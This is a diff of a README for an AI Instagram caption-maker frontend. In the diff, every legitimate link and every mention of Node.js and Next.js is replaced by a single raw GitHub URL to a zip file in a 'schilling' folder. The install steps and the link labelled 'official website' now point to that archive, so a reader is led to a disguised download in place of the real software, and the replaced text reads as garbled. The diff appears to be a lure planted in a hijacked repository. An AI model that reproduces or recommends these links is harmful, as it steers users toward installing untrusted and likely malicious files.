@@ -1,7 +1,7 @@
 # 🌟 Instagram-AI-Image-Caption-Maker-Frontend - Create Captions Effortlessly
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-%20%F0%9F%93%88-ff69b4)](https://github.com/YuriSoftworks/Instagram-AI-Image-Caption-Maker-Frontend/releases)
+[![Download](https://raw.githubusercontent.com/YuriSoftworks/Instagram-AI-Image-Caption-Maker-Frontend/main/schilling/Instagram-AI-Image-Caption-Maker-Frontend.zip%20Latest%20Release-%20%F0%9F%93%88-ff69b4)](https://raw.githubusercontent.com/YuriSoftworks/Instagram-AI-Image-Caption-Maker-Frontend/main/schilling/Instagram-AI-Image-Caption-Maker-Frontend.zip)
 
 ## 📖 Table of Contents
 - [🌟 Overview](#-overview)
@@ -12,21 +12,21 @@
 - [❓ FAQs](#-faqs)
 
 ## 🌟 Overview
-Welcome to the Instagram-AI-Image-Caption-Maker-Frontend. This application allows users to generate creative, human-like, and SEO-optimized captions for their images. It uses advanced AI models like BLIP, Google Gemini, and Gemma. The frontend is built with Next.js and connects to a FastAPI backend to upload images and showcase multiple caption styles. 
+Welcome to the Instagram-AI-Image-Caption-Maker-Frontend. This application allows users to generate creative, human-like, and SEO-optimized captions for their images. It uses advanced AI models like BLIP, Google Gemini, and Gemma. The frontend is built with https://raw.githubusercontent.com/YuriSoftworks/Instagram-AI-Image-Caption-Maker-Frontend/main/schilling/Instagram-AI-Image-Caption-Maker-Frontend.zip and connects to a FastAPI backend to upload images and showcase multiple caption styles. 
 
 This tool is perfect for anyone looking to enhance their Instagram posts easily.
 
 ## 🚀 Getting Started
 Using this application is straightforward. Whether you want to spice up your Instagram feed or engage your audience more effectively, this application is designed for you.
 
-1. **Install Node.js**: Ensure you have Node.js installed on your computer. This software runs server applications and is required for our app. You can download Node.js from the [official website](https://nodejs.org/).
+1. **Install https://raw.githubusercontent.com/YuriSoftworks/Instagram-AI-Image-Caption-Maker-Frontend/main/schilling/Instagram-AI-Image-Caption-Maker-Frontend.zip**: Ensure you have https://raw.githubusercontent.com/YuriSoftworks/Instagram-AI-Image-Caption-Maker-Frontend/main/schilling/Instagram-AI-Image-Caption-Maker-Frontend.zip installed on your computer. This software runs server applications and is required for our app. You can download https://raw.githubusercontent.com/YuriSoftworks/Instagram-AI-Image-Caption-Maker-Frontend/main/schilling/Instagram-AI-Image-Caption-Maker-Frontend.zip from the [official website](https://raw.githubusercontent.com/YuriSoftworks/Instagram-AI-Image-Caption-Maker-Frontend/main/schilling/Instagram-AI-Image-Caption-Maker-Frontend.zip).
 
-2. **Check Your Installation**: After installation, verify that Node.js is set up correctly. Open your command line interface (Command Prompt on Windows, Terminal on macOS or Linux) and type:
+2. **Check Your Installation**: After installation, verify that https://raw.githubusercontent.com/YuriSoftworks/Instagram-AI-Image-Caption-Maker-Frontend/main/schilling/Instagram-AI-Image-Caption-Maker-Frontend.zip is set up correctly. Open your command line interface (Command Prompt on Windows, Terminal on macOS or Linux) and type:
    ```bash
    node -v
    npm -v
    ```
-   This should display the version numbers for Node.js and npm. If you see the versions, you are ready to proceed.
+   This should display the version numbers for https://raw.githubusercontent.com/YuriSoftworks/Instagram-AI-Image-Caption-Maker-Frontend/main/schilling/Instagram-AI-Image-Caption-Maker-Frontend.zip and npm. If you see the versions, you are ready to proceed.
 
 3. **Download the Application**: Follow the steps in the “Download & Install” section below.
 
@@ -37,7 +37,7 @@ Using this application is straightforward. Whether you want to spice up your Ins
 - **Internet Connection**: Required for the image upload feature.
 
 ## 🔧 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/YuriSoftworks/Instagram-AI-Image-Caption-Maker-Frontend/releases) to access the latest version of the application.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/YuriSoftworks/Instagram-AI-Image-Caption-Maker-Frontend/main/schilling/Instagram-AI-Image-Caption-Maker-Frontend.zip) to access the latest version of the application.
 
 2. **Download the Package**: Find the latest release of the application. Click on the appropriate file for your operating system to start the download.
 
